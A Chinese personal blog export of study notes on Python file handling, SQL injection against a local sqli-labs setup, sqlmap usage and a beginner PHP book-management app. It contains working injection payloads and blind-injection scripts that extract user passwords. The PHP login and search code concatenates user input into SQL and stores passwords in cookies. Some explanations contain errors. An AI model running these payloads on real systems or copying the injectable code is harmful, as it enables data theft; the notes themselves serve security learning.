追加模式（“a”）：打开文件并将内容写入文件，如果文件存在，则在文件末尾添加内容。如果文件不存在则创建一个新的文件。​ 读写模式（“r+”）：打开文件供读取和写入，如果文件存在，则覆盖原有内容。如果文件不存在，将抛出FileNotFoundError异常。 使用write()可以完后向文件写入数据f &#x3D; open(“test.txt”,”w”) #打开文件，w模式（写模式），文件不存在就新建f.write(“hello world,I am here!”) #将字符串写入文件中f.close() #关闭文件 写入字节数据使用write()方法将字节数据写入文件。可以使用encode()方法将字符串转换为字节数据进行写入。 写入字节数据with open(“file.txt”, “wb”) as file: content &#x3D; “Hello, World!\\n” file.write(content.encode(&quot;utf-8&quot;)) 读数据（read） 使用read(num)可以从文件中读取数据，num表示要从文件中读取的数据的长度(单位是字节)，如果没有传入num，那么就表示读取文件中的所有数据 #读：read方法，读取指定的字符，开始时定位在文件头部，每执行一次向后移动指定字符数f = open(&quot;test.txt&quot;,&quot;r&quot;)content = f.read(5) #一次读五个字符print(content)print(&#39;-&#39;*30)content = f.read()print(content)f.close() 读数据（readlines）​ 就像read没有参数时一样，readlines可以按照行的方式把整个文件中的内容进行一次性的读取，并且返回的是一个列表，其中每一行的数据为一个元素 获取文件信息12345import os for file in os.scandir(): print(file.stat()) os.stat(文件名） 文件的相关操作 有些时候，需要对文件进行重命名、删除一些操作，python的os模块中都有这些功能 文件重命名 os模块中的rename()可以完成对文件的重命名操作rename(需要修改的文件名，新的文件名)text.txt被改为了ppt.txt。 删除文件 os中的remove()可以完成对文件的删除操作remove(待删除的文件名)，删除ppt.txt文件。 12import os os.remove(&quot;ppt.txt&quot;) 创建文件夹12import osos.mkdir(&quot;张三&quot;) 创建一个名叫张三的文件夹。 获取当前目录12import osos.getcwd() 移动文件两种方式使用： 第二个参数是文件夹位置，则移动到文件夹下面 第二个参数是文件路径，移动到这个路径并且重命名注意：如果是文件夹后面一定要加&#39;/&#39;。 shutil.move(要移动的文件&#x2F;文件夹,要移动的位置) 12import shutil shutil.move(&#x27;file.txt&#x27;,&#x27;张三&#x27;) 复制文件shutil.copy(要复制的文件，要复制到的位置) import shutilshutil.copy(&#39;file1.txt&#39;,&#39;./张三&#39;) #复制到路径下shutil.copy(&#39;file1.txt&#39;,&#39;./张三/f2&#39;) #复制到路径下并重命名 遍历目录下所有的文件123for dirpath, dirnames, files in os.walk(&#x27;./&#x27;): print(f&#x27;发现文件夹：&#123;dirpath&#125;&#x27;) print(files) 创建临时文件TemporaryFile() from tempfile import TemporaryFilef = TemporaryFile(&#39;w+&#39;)f.write(&#39;Hello World&#39;)f.seek(0)data = f.readlines()print(data)f.close() with TempooraryFile(&#39;w+&#39;) as f: f.write(&#39;Hello World&#39;) f.seek(0) data = f.readlines() print(data)‘w+’表示写入及读取文件 .seek(0)表示回到文件开头位置 程序运行完后会自动删掉临时文件 匹配文件名1234import fnmatch print(fnmatch.fnmatch(&#x27;lesson1.py&#x27;, &#x27;le*1.py&#x27;)) # Trueprint(fnmatch.fnmatch(&#x27;lesson1.py&#x27;,&#x27;le*[0-9].py&#x27;)) # True 匹配文件名称（1）字符串内置方法.startswith(),.endswith() （2）glob模块import globprint(glob.glob(&#39;*.py&#39;))print(glob.glob(&#39;**/.txt&#39;,recursive=True)) 模式 意义 ＊ 匹配所有 ? 匹配任何单个字符 [seq] 匹配seq中的任何字符 [!seq] 匹配任何不在seq中的字符 用**表示任意层文件或文件夹 recursive＝True会不断进入文件夹内 异常处理try: with open(&#39;file.txt&#39;, &#39;r&#39;) as file: content = file.read() print(content) except FileNotFoundError: print(&#39;文件不存在&#39;)","path":"2023/12/22/python3/","date":"12-22","excerpt":"","tags":[{"name":"文件操作","slug":"文件操作","permalink":"http://example.com/tags/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"}]},{"title":"sql注入2","text":"sql报错函数1、通过floor报错,注入语句如下: and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a); ​ rand() 是一个随机函数：产生0～1的小数。爆库 2、通过ExtractValue报错,注入语句如下: and (extractvalue(1,concat(0x7e,(select user()),0x7e)));爆信息 3、通过UpdateXml报错,注入语句如下: and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))爆出用户名和密码，但应位数有限，只能显示部分 4、通过exp报错,注入语句如下: and exp(~(select * from (select user () ) a) ); 5、通过GeometryCollection()报错,注入语句如下: and GeometryCollection(()select *from(select user () )a)b ); 6、通过polygon ()报错,注入语句如下: and polygon((select * from(select * from(select user())a)b)); 7、通过multlinestring ()报错,注入语句如下: and multipoint((select * from(select * from(select user())a)b)); 8、通过multipoint ()报错,注入语句如下: multipoint((select * from(select * from(select user())a)b)) 9、通过multpolygon ()报错,注入语句如下: and multpolygon (()select * from(selectuser () )a)b ); 10、通过linestring ()报错,注入语句如下: and linestring((select * from(select * from(select user())a)b)); postman利用postman寻找漏洞。找到一个网站，然后F12，刷新一下，网络的地方出现了一些文件，在界面随便输入，出现了login.api文件。 点击文件，找到路径，是用get请求。 复制url,打开postman，粘贴到send里面，然后点击发送。 请求方式get,可以在id列进行SQL注入操作。 判断回显点和闭合点，order by 3正常，4错误 利用查询语句进行注入，爆库爆flag信息。 bool盲注脚本​ 布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false，从而达到注入的目的来获取信息。 Bool盲注常用的函数：database() 显示数据库名称mid(a,b,c) 从位置b开始，截取a字符串的c位length() 返回字符串的长度char() 将ASCII码转换为对应的字符 ascii() 函数，返回字符ascii码值参数 : str单字符 length() 函数，返回字符串的长度参数 : str 字符串 left() 函数，返回从左至右截取固定长度的字符串，left(a,b) 从左侧截取a的前b位，参数str, length。str : 字符串 ，length：截取长度 substr()&#x2F;substring() 函数 ， 返回从pos位置开始到length长度的子字符串参数，str，pos，lengthstr: 字符串pos：开始位置length： 截取长度substr(a,b,c) 从b位置开始，截取字符串a的c长度 import requests #导入Python的requests库，用于发送HTTP请求。 session = requests.session()#建一个新的HTTP会话。这使得所有的请求都在同一个会话中，这有助于处理重定向和Cookies等。 url=&quot;http://192.168.2.5/sqli/Less-5/?id=1&#39;&quot;#定义了一个URL，这个URL是一个已知存在SQL注入漏洞的网站 def db():#定义了一个名为db的函数，该函数是整个攻击的核心： name = &#39;&#39;#初始化一个空字符串，用于存储提取出的字符。 for i in range(1,50):#这是一个二分查找的循环，目的是找到ASCII码中特定字符的位置： ​ left = 32 #定义了ASCII码的起始和结束范围。 ​ right = 128 ​ mid = (left+right)//2 #计算中间值。 ​ while left&lt;right: #在循环内部，根据响应的内容判断中间值是否接近目标字符的ASCII码。#如果接近，则缩小范围到右半部分；否则，缩小范围到左半部分。 ​ paramsGet = url+ &quot;/**/and/**/ascii(substr((select group_concat(username,password) from users ),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;.format(i,mid) ​ \\#构建一个用于SQL注入的GET请求。这尝试获取users表中username和password列的值，并检查第i个字符的ASCII码是否等于mid。 ​ response=session.get(paramsGet)#发送GET请求并获取响应。 ​ if &#39;You are in...........&#39; in response.text:#检查响应的内容中是否包含“You are in...........”， ​ left = mid+1 #据响应的内容更新查找范围。 ​ mid = (left+right)//2 ​ else: ​ right = mid ​ mid = (right+left)//2 ​ if(mid==32):#如果mid与初始值32相等，则跳出循环。 ​ break ​ name += chr(mid) ​ print(name) #将找到的字符添加到name字符串中，并打印出来。 db() #调用定义的函数 使用了基于二分查找的盲注技术来提取数据库中的用户名和密码。 运行结果 时间注入​ 时间注入又名延时注入、睡眠注入，属于盲注的一种，通常是某个注入点无法通过布尔型注入获取数据而采取的一种突破注入的技巧。​ 在MySQL里函数sleep（）是延时的意思，sleep（10）就是数据库延时10秒返回内容。判断注入可以使用’and sleep(10)意思是数据库延时10秒返回内容值（页面响应时间至少为10秒）​ MySQL延时注入用到的函数sleep（）、if（）、substring（） select if(2&gt;1,sleep(10),0)2&gt;1这部分就是你注入要构造的SQL语句。​ select if（length(database())&gt;1,sleep(5),0）这个就是查询当前数据库长度，如果成立网页就大于5秒返回，如果不成立就立即执行 根据这个原理n&gt;1，n不延时就可以确认当前数据库的长度这是睡眠注入的一个简单脚本 import requests import time &#96;&#96; session = requests.session() url = &quot;http://192.168.2.113/sqli/Less-5/?id=1&#39;&quot; &#96;&#96; def db(): name = &#39;&#39; for i in range(1, 50): ​ left = 32 ​ right = 128 ​ mid = (left + right) // 2 ​ while left &lt; right: ​ paramsGet = url + &quot;/**/and/**/ascii(substr((select group_concat(username,password) from users ),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;.format(i, mid) ​ start_time = time.time() ​ response = session.get(paramsGet) ​ end_time = time.time() ​ elapsed_time = end_time - start_time ​ if &#39;You are in...........&#39; in response.text: ​ left = mid + 1 ​ mid = (left + right) // 2 ​ else: ​ right = mid ​ mid = (right + left) // 2 ​ if elapsed_time &gt; 0.5: # 设置阈值为0.5秒，根据实际情况调整 ​ break ​ if mid == 32: ​ break ​ name += chr(mid) ​ print(name) db() 运行结果： 堆叠注入堆叠注入(stacked injections)从名词的含义就可以看到应该是一堆sql语句(多条)一起执行，而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加“;”表示语句结束的，这样我们就想到了是不是可以多句一起使用就叫做堆叠注入 不是每个数据库环境都可以支持堆叠注入 MySQL数据库多语句执行：在mysql数据库中执行如下语句： select * from users; select * from emails;select 1,(select group_concat(1,2,3)),3;select 1,2,3 union select 4,5,6","path":"2023/12/21/sql注入2/","date":"12-21","excerpt":"","tags":[{"name":"postman","slug":"postman","permalink":"http://example.com/tags/postman/"},{"name":"sql报错函数","slug":"sql报错函数","permalink":"http://example.com/tags/sql%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0/"},{"name":"bool和睡眠盲注脚本","slug":"bool和睡眠盲注脚本","permalink":"http://example.com/tags/bool%E5%92%8C%E7%9D%A1%E7%9C%A0%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/"}]},{"title":"sql注入1","text":"sql基础知识从mysql5.0开始,MySQL自带information_schema数据库，它提供了访问数据库元数据的方式。 information_schema：是MySQL自带的数据库，主要保持MySQL数据库服务器的系统信息，比如数据库的名称，数据库表的名称，字段名称，存储权限等。 performance_schema：是MySQL系统自带的数据库，可以用来监控MySQL的各类性能指标。 sys：是MySQL系统自带的数据库，主要作用是，以一种更容易被理解的方式展示MySQL数据库服务器的各类性能指标。 ​ use 数据库名，就是当前数据库。。 show databases会显示当前连接有哪些数据库。show tables会显示当前数据库的表。 select直接加数字时，可以不写后面的表名，那么它输出的内容就是我们select后的数字。 单纯的输入select 1,2,3;会输出 sql函数语法：查库：select schema_name from information_schema.schemata查表：select table_name from information_schema.tables where table_schema&#x3D;’security’查列：select column_name from information_schema.columns where table_name&#x3D;’users’查字段：select username,passord from security.users查系统用户：select system_user()查数据库：select database()查版本信息：select version()查安装路径：select @@datadir查操作系统：select @@version_compile_os group_concat( [DISTINCT] 要连接的字段 [Order BY 排序字段 ASC&#x2F;DESC] [Separator ‘分隔符’] ) group_concat只有与group by语句同时使用才能产生效果 所以使用 GROUP_CONCAT（）函数必须对源数据进行分组，否则所有数据会被合并成一行 实例select group_concat(id,”“,username,”“,password) from users ; select 1,group_concat(column_name) ,3 from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database();查询列名 select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema&#x3D;database();查询表名 select group_concat(id,”“,username,”“,password) from users ; SQL注入判断注入点 —— 第一步找页面与数据库产生交互的地方。 找到界面中的 url ： url中 ’ ? ’ 后跟的就是参数id=1，’ ? ’ 表示传参。一般来讲 ’ ? ‘的内容都是用户可控的。若不存在能够与数据库产生交互的地方，那么sql注入也就自然无处下手了。这里id=后面的内容就可以进行参数修改啦。 传入SQL语句可控参数分为两类 数字类型，参数不用被引号引用 ?id=1 其他类型，参数需要被引号引用 ?name=&quot;phone&quot; 判断字段数 —— 第二步使用order by子句，利用网页报错判断字段数，为下一步铺垫。 order by 3正确order by4报错，说明字段有3个。 判断回显点 —— 第三步使用union select语句，联合查询，通过页面回显找到回显点，再利用其获取我们需要查询的数据。 UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。联合查询前后的两个表，第一个表的字段数与第二个表的字段数必须相等，否则就会报错。如果一个表的字段数与第二个表的字段数不相等，我们可以进行如下操作手动补全： 发现，这个界面与初始界面一模一样。因为这里优先显示的是联合查询的第一个结果，而第二个结果未被显示。所以我们只需要在这里使联合查询的第一个结果不显示（使前半段语句为假，则不返回任何内容）：id&#x3D;-1或者id&#x3D;1 and 1&#x3D;2 回显点就在”Your Login Name“和”Password“ 后的位置。 查询相关内容 —— 第四步information_schema : mysql数据库5.0以上版本，自带数据库，记录了mysql下所有的库名，表名，列名等信息。 schemata表 (mysql服务器中所有数据库信息的表) tables表 (mysql服务器中所有表信息的表) columns表（mysql服务器所有列信息的表） table_schema 数据库名 table_name 表名 column_name 列名 判断库名MySQL中的 database()函数 返回默认或当前数据库的名称。 在刚刚的回显点加入database函数，以此得到库名 判断表名从表中选取数据: SELECT_(列名1,2,3,…)_ FROM _(表名) 注意这里不能直接写表名tables， 否则它会在error库下找tables表，找不到就会报错。因此需要使用【库名.表名】的格式：security.tables where子句用于规定选择的标准 我们需要查询的是scurity 库的表名，因此在查询中限定table_schema&#x3D;’security’.也就是返回本张表中所有table_schema这一字段的值为security的数据所对应的table_name值。这里显示位只有两个，而我们查到的数据不止2条，我们需求是把所有查到的表都显示出来，所以我们要用group_concat()函数连接起来作为一行显示。 判断列名同理，列column_name在表information_schema.column下union后修改为 查询信息 关于字符型、数值型的判断 $id 数字型（id&#x3D;$id） 字符型 （id&#x3D;’$id’） 1 and 1&#x3D;1 id&#x3D;1 and 1&#x3D;1 返回正常 id&#x3D;‘1 and 1&#x3D;1’ 返回正常 1 and 1&#x3D;2 id&#x3D;1 and 1&#x3D;2 返回错误 id&#x3D;‘1 and 1&#x3D;2’ 返回正常 1 or 1&#x3D;1 id&#x3D; 1 or 1&#x3D;1 返回正常 id&#x3D; ‘1 or 1&#x3D;1’ 返回正常 1 or 1&#x3D;2 id&#x3D;1 or 1&#x3D;2 返回正常 id&#x3D;‘1 or 1&#x3D;2’ 返回正常 1’ id&#x3D;1’ 返回错误 id&#x3D;‘1’’ 返回错误 1’ –+ id&#x3D;1’ –+ 返回错误 id&#x3D;‘1’ –+’’ 返回正常 sqlmap​ SQLmap是一款「自动化」SQL注入工具，kali自带。路径 &#x2F;usr&#x2F;share&#x2F;sqlmap 打开终端，输入sqlmap，出现以下界面，就说明SQLmap「可用」。 ​ 或者Sqlmap官网：http://sqlmap.org/，Sqlmap的安装需要Python环境，最新版可以运行在 Python 2.6, 2.7 和 3.x 版本的任何平台上。 下载完成后可以添加进环境变量，方便使用（不添加也可以用） Sqlmap简介​ Sqlmap是一个开源的渗透测试工具，可以用来自动化的检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。 ​ 目前支持的数据库有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access等大多数据库。 Sqlmap支持的注入方式：Sqlmap全面支持六种SQL注入技术： ​ 基于布尔类型的盲注：即可以根据返回页面判断条件真假的注入。 ​ 基于时间的盲注：即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已执行(即页面返回时间是否增加)来判断。 ​ 基于报错注入：即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中。 ​ 联合查询注入：在可以使用Union的情况下的注入。 ​ 堆查询注入：可以同时执行多条语句时的注入。 ​ 数据库指纹识别:通过识别数据库指纹，实现特定数据库的注入 带外注入：构造SQL语句，这些语句在呈现给数据库时会触发数据库系统创建与攻击者控制的外部服务器的连接。以这种方式，攻击者可以收集数据或可能控制数据库的行为。 Sqlmap输出级别：使用 Sqlmap 对一个注入点进行测试时，可以使用 -v x 参数指定回显信息的复杂度，x范围为[0~6]，共有 7 个等级，默认为 1。 0：只显示python错误以及严重的信息。1：同时显示基本信息和警告信息。（默认）2：同时显示debug信息。3：同时显示注入的payload。4：同时显示HTTP请求。5：同时显示HTTP响应头。6：同时显示HTTP响应页面。如果想看到 Sqlmap 发送的测试 payload 最好的等级就是3，例： sqlmap.py -v 3 -u &quot;http://www.xxx.com/a.php?id=x&quot; 可以输入sqlmap -h来查找帮助命令。 用法: python3 sqlmap [选项] 选项: -h, –help 显示基本帮助信息并退出 -hh 显示高级帮助信息并退出 –version 显示程序版本号并退出 -v VERBOSE 冗长输出级别: 0-6 (默认 1) 目标: 至少需要提供以下选项之一来定义目标 -u URL, --url=URL 目标URL (例如 &quot;http://www.site.com/vuln.php?id=1&quot;) -g GOOGLEDORK 使用Google dork结果作为目标URL 请求: 这些选项可用于指定如何连接到目标URL --data=DATA 通过POST发送的数据字符串 (例如 &quot;id=1&quot;) --cookie=COOKIE HTTP Cookie头的值 (例如 &quot;PHPSESSID=a8d127e..&quot;) --random-agent 使用随机选择的HTTP用户代理头值 --proxy=PROXY 使用代理连接到目标URL --tor 使用Tor匿名网络 --check-tor 检查Tor是否被正确使用 注入: 这些选项可用于指定要测试哪些参数，提供自定义注入载荷和可选的篡改脚本 -p TESTPARAMETER 可测试的参数(s) --dbms=DBMS 强制指定后端DBMS 检测: 这些选项可用于自定义检测阶段 --level=LEVEL 执行测试的级别 (1-5, 默认 1) --risk=RISK 执行测试的风险等级 (1-3, 默认 1) 技术: 这些选项可用于调整特定SQL注入技术的测试 --technique=TECH.. 要使用的SQL注入技术 (默认 &quot;BEUSTQ&quot;) 枚举: 这些选项可用于枚举后端数据库管理系统的信息、结构和表中包含的数据 -a, --all 获取所有信息 -b, --banner 获取DBMS横幅 --current-user 获取DBMS当前用户 --current-db 获取DBMS当前数据库 --passwords 枚举DBMS用户密码哈希 --dbs 枚举DBMS数据库 --tables 枚举DBMS数据库表 --columns 枚举DBMS数据库表列 --schema 枚举DBMS模式 --dump 转储DBMS数据库表条目 --dump-all 转储所有DBMS数据库表条目 -D DB 枚举的DBMS数据库 -T TBL 要枚举的DBMS数据库表(s) -C COL 要枚举的DBMS数据库表列(s) 操作系统访问: 这些选项可用于访问后端数据库管理系统底层操作系统 --os-shell 提示输入交互操作系统shell --os-pwn 提示输入OOB shell、Meterpreter或VNC 一般: 这些选项可用于设置一些通用的工作参数 --batch 从不要求用户输入，使用默认行为 --flush-session 清除当前目标的会话文件 杂项: 这些选项不属于任何其他类别 --wizard 针对入门用户的简易向导界面 若要查看完整的选项列表，请使用 ‘-hh’ 选项运行 利用sqlmap进行注入查询出表名。 sqlmap -u “http://192.168.2.113/sqli/Less-1/?id=1“ –batch -D security –tables 查询id和用户名字段sqlmap -u “http://192.168.2.113/sqli/Less-1/?id=1“ –batch -D security -T users -C “id,username” –dump 查询有哪些数据库 -r XX.txt –dbs (-r指定POST请求所在的路径) 查询security数据库中有哪些表 -r XX.txt -D security –tables 查询security数据库中users表有哪些字段 security.users -r XX.txt -D security -T users –columns dump出字段username与password中的数据 -r XX.txt -D security -T users -C “username,password” –dump","path":"2023/12/19/sql注入1/","date":"12-19","excerpt":"","tags":[{"name":"sql 注入","slug":"sql-注入","permalink":"http://example.com/tags/sql-%E6%B3%A8%E5%85%A5/"},{"name":"sqlmap","slug":"sqlmap","permalink":"http://example.com/tags/sqlmap/"},{"name":"联合查询","slug":"联合查询","permalink":"http://example.com/tags/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/"}]},{"title":"php实操","text":"学习了几天php知识，该动手练习了。 目标是建一个简单的图书管理系统。 index页面首先就是搭建一个首页，index页面， 这个就是一个简单欢迎，用html,加点样式再附上背景图即可。 点击开始使用，这里放置了登录页面的链接，点击就进入了登录页面。 登录和注册接下来是登录和注册， 登录页面登录页面用的是form表单，为了美观，设置css样式，可以在头部style，也可以链接css文件。点击登录会提交到link.php文件。这个文件会连接到数据库，查看登录信息，即没有用户信息是登录不了的。之前演示过效果，就不占篇幅了。 直接看看结果，我在登录和注册页面都设置了跳转链接，这样就可以快速切换页面。 注册页面注册页面界面没什么好说的，设置样式，增加点信息内容。为了交互数据库，我创建了rlink文件，注册的信息直接到了user表，又在rlink文件中设置了注册完后跳转到登录界面，就实现了注册后可以用注册的账号登录。 这里这串代码 &#x2F;&#x2F; 插入数据到用户表 $stmt &#x3D; $conn-&gt;prepare(“INSERT INTO users (username, password, phone, sex, identity) VALUES (?, ?, ?, ?, ?)”); $stmt-&gt;bind_param(“sssss”, $username, $password, $phone, $sex, $identity); 就是实现将注册信息插入到数据库 &#x2F;&#x2F; 创建连接$conn &#x3D; new mysqli($servername, $dbusername, $dbpassword, $dbname); &#x2F;&#x2F; 检测连接if ($conn-&gt;connect_error) { die(“连接失败: “ . $conn-&gt;connect_error);} 这是连接数据库 if ($stmt-&gt;execute()) { &#x2F;&#x2F; 注册成功，重定向到登录页面（或任何其他页面） header(‘Location: login.php’); exit(); } else { die(‘注册失败：’ . $stmt-&gt;error); } 这是判断连接成功还是失败。 主页登录界面登录成功后会跳转到主页，即登录后进入的页面。 因为没想好，所有随便搞了一下。 导航栏都有各个部分的页面连接，来实现功能。既然是图书，就要找书，搜索框可以搜索数据库的book表中的书。 搜索什么都不输入点击搜索框就会将book表中的书籍全显示。 输入书的书名或者部分书名就可以显示书籍。例如，输入‘斗’字。 搜索用的是from表单，点击会提交到search.php文件，让他来实现搜索，将书的信息列出来。 $searchInput &#x3D; $_GET[‘search’]; &#x2F;&#x2F; 执行搜索查询并显示结果 $sql &#x3D; “SELECT * FROM book WHERE title LIKE ‘%$searchInput%’ OR author LIKE ‘%$searchInput%’”; $result &#x3D; $conn-&gt;query($sql); 用的是sql查询。 入库图书可以添加图书，利用入库功能输入书籍数据，可以插入book表，可以用搜索功能搜索出来。 add.php实现页面，add_process.php进行数据库操作。 管理员页面管理员页面可以对用户进行删除，注册就是增加用户 管理员进行操作要先进行登录管理员账户。 点击删除就可以将用户删除，就不能用这个账号登录。删除操作靠点击跳转delete.php文件来实现对user表的删除操作。 点击返回首页可以回到首页。 图书借阅图书借阅，用的是borrow表。输入借阅信息，就会显示借阅成功 图书归还 点击归还，借阅记录就会消失。 postman​ Postman是一个接口测试工具，相当于一个客户端。它可以模拟用户发起的各类HTTP请求，将请求数据发送至服务端，获取对应的响应结果。这样，使用者可以验证响应中的结果数据是否和预期值相匹配，同时确保开发人员能够及时处理接口中的bug，进而保证产品上线之后的稳定性和安全性。 ​ 此外，Postman也可以用来模拟各种HTTP请求（如：get&#x2F;post&#x2F;delete&#x2F;put等），与一些浏览器相比，Postman能更直观地展示接口返回的结果。 安装并打开Postman应用程序。 在左侧的导航栏中选择“Collections”选项，然后选择要使用的集合。 在右侧的请求编辑器中，选择请求方法（如GET、POST等），输入URL，并添加请求参数。 点击“Send”按钮发送请求，查看响应结果。 在响应结果中，可以查看响应的状态码、响应时间、响应头和响应体等信息。 如果需要，可以使用Postman的断言功能来验证响应中的数据是否符合预期。 保存测试用例并重复执行，以便进行多次测试和验证。 需要注意的是，使用Postman进行接口测试需要一定的技术基础和对HTTP协议的了解。同时，在进行接口测试时，需要注意测试的全面性和有效性，确保测试覆盖了所有可能的场景和边界条件。 YaKit​ YAKit（YAKit安全测试平台）是一个基于YAK语言（一种网络安全底层能力融合的垂直开发语言）编写的工具，功能类似Burpsuite。YAKit主要功能包括拦截http&#x2F;s数据包、漏洞检测、网站地图、自动&#x2F;手动测试web应用、编码解码、请求与响应差异数据化等。 ​ 此外，YAKit插件库还集成了多个专项漏洞检测的插件，支持检测排查新发现的以及过去的经典级漏洞，如log4j2漏洞和struts2漏洞。 类Burpsuite的MITM劫持操作台：YAKit可以作为中间人代理，拦截和查看HTTP&#x2F;S请求和响应，帮助安全人员分析网站的安全性。 查看所有劫持到的请求的历史记录以及分析请求的参数：YAKit可以记录所有拦截到的请求，并允许安全人员对请求参数进行分析，以发现潜在的安全问题。 全球第一个可视化的Web模糊测试工具：YAKit集成了Web Fuzzer插件，可以对Web应用进行模糊测试，帮助发现潜在的漏洞。 Yak Cloud IDE：YAKit内置了一个云IDE，支持智能提示和代码编写，方便安全人员进行开发和调试。 ShellReceiver：YAKit可以通过开启TCP服务器接收反弹交互式Shell的反连，帮助安全人员远程控制被测试的系统。 第三方Yak模块商店：YAKit支持社区主导的第三方Yak模块插件，可以扩展其功能和用途。 使用YAKit的方法： 安装和配置：首先需要安装和配置YAKit，包括选择连接模式、配置代理、下载证书等。 打开YAKit并进入中间人代理模式：在浏览器中打开YAKit，并选择中间人代理模式。 拦截请求：在YAKit中选择要拦截的网站请求，并进行拦截。 分析响应：在YAKit中可以查看请求头、响应数据等信息，并进行修改或提交。 提交数据：在需要的情况下，可以将修改后的数据提交给网站进行测试。","path":"2023/12/16/php实操/","date":"12-16","excerpt":"","tags":[{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"html","slug":"html","permalink":"http://example.com/tags/html/"},{"name":"postman","slug":"postman","permalink":"http://example.com/tags/postman/"}]},{"title":"php学习1","text":"php函数​ PHP 的真正威力源自于它的函数。 ​ 在 PHP 中，提供了超过 1000 个内建的函数。如要在页面加载时执行脚本，可以把它放到函数里。 函数是通过调用函数来执行的。可以在页面的任何位置调用函数。 创建 PHP 函数函数是通过调用函数来执行的。 ​ 语法 PHP 函数准则： 函数的名称应该提示出它的功能 函数名称以字母或下划线开头（不能以数字开头） PHP 函数 - 添加参数为了给函数添加更多的功能，我们可以添加参数，参数类似变量。 ​ 参数就在函数名称后面的一个括号内指定。‘’’&lt;?phpfunction writeName($fname){​ echo $fname . “ Refsnes.“;} echo “My name is “;writeName(“Kai Jim”);echo “My sister’s name is “;writeName(“Hege”);echo “My brother’s name is “;writeName(“Stale”);?&gt;‘’’ 运行结果 PHP 函数 - 返回值如需让函数返回一个值，请使用 return 语句。 实例 &lt;?php function add($x,$y) &#123; $total=$x+$y; return $total; &#125; echo &quot;1 + 16 = &quot; . add(1,16); ?&gt; PHP 变量函数变量函数是指在 PHP 中，将一个变量作为函数名来调用的函数。 变量函数可以让我们在运行时动态地决定调用哪个函数。 123456789101112131415161718192021222324&lt;?phpfunction foo() &#123; echo &quot;In foo()&lt;br /&gt;\\n&quot;;&#125;function bar($arg = &#x27;&#x27;)&#123; echo &quot;In bar(); argument was &#x27;$arg&#x27;.&lt;br /&gt;\\n&quot;;&#125;// 使用 echo 的包装函数function echoit($string)&#123; echo $string;&#125;$func = &#x27;foo&#x27;;$func(); // 调用 foo()$func = &#x27;bar&#x27;;$func(&#x27;test&#x27;); // 调用 bar()$func = &#x27;echoit&#x27;;$func(&#x27;test&#x27;); // 调用 echoit()?&gt; 登录验证1234567891011121314151617181920212223&lt;?phpheader(&#x27;content-type: text/html; charset=utf-8&#x27;);session_start();if(isset($_POST[&#x27;submit&#x27;]))&#123; $u = trim($_POST[&#x27;username&#x27;]); $p = trim($_POST[&#x27;password&#x27;]); $link=mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;security&quot;)or exit(&quot;Error connecting&quot;); mysqli_query($link,&quot;set names utf8&quot;); $sql= &quot;select * from users where username=&#x27;$u&#x27; and password=&#x27;$p&#x27;&quot;; $result=mysqli_query($link, $sql) ; if(mysqli_num_rows($result)&gt;=1)&#123; $_SESSION[&#x27;user&#x27;]=$u; setcookie(&#x27;password&#x27;,$p,time()+7*12*60*60); header(&#x27;Location:zhuye.php&#x27;); exit(); &#125;else&#123; echo &quot;&lt;br&gt;&quot;; echo &#x27;用户名或密码错误!请重新输入!&#x27;; //sleep(3); echo &#x27;&lt;h1&gt;&lt;a href=&quot;./index.php&quot;&gt;返回&lt;/a&gt;&lt;/h1&gt;&#x27;; &#125;&#125; header(&#39;content-type: text/html; charset=utf-8&#39;); 设置 HTTP 响应头，指定内容类型为 HTML，并设置字符集为 UTF-8。 session_start(); 启动 PHP 会话，用于存储和获取会话数据。 if(isset($_POST[&#39;submit&#39;]))&#123; 检查是否提交了表单。如果表单已提交，将执行以下代码块。 $u = trim($_POST[&#39;username&#39;]); 从 POST 请求中获取用户名，并使用 trim() 函数去除用户名前后的空白字符。 $p = trim($_POST[&#39;password&#39;]); 从 POST 请求中获取密码，并使用 trim() 函数去除密码前后的空白字符。 $link=mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;security&quot;)or exit(&quot;Error connecting&quot;); 使用 MySQLi 扩展连接到本地 MySQL 数据库。如果连接失败，将退出并显示错误消息。 mysqli_query($link,&quot;set names utf8&quot;); 设置数据库连接的字符集为 UTF-8。 $sql= &quot;select * from users where username=&#39;$u&#39; and password=&#39;$p&#39;&quot;; 构建 SQL 查询语句，从 users 表中查找与输入的用户名和密码匹配的记录。 $result=mysqli_query($link, $sql) ; 执行 SQL 查询，并将结果存储在 $result 变量中。 if(mysqli_num_rows($result)&gt;=1)&#123; 检查查询结果中是否有至少一行数据。如果有，表示找到了匹配的用户。 $_SESSION[&#39;user&#39;]=$u; 将找到的用户名存储在会话中，方便后续访问。 setcookie(&#39;password&#39;,$p,time()+7*12*60*60); 设置一个名为 password 的 cookie，其中包含密码，有效期为 7 天（7 天 * 12 小时&#x2F;天 * 60 分钟&#x2F;小时）。这通常不是一个好的做法，因为直接存储密码在 cookie 中是不安全的。 header(&#39;Location:zhuye.php&#39;); 重定向到 zhuye.php 页面。这通常是用户成功登录后的目标页面。 exit(); 结束脚本执行。 &#125;else&#123; 如果查询结果中没有找到匹配的记录，执行以下代码块。 echo &#39;用户名或密码错误!请重新输入!&#39;; 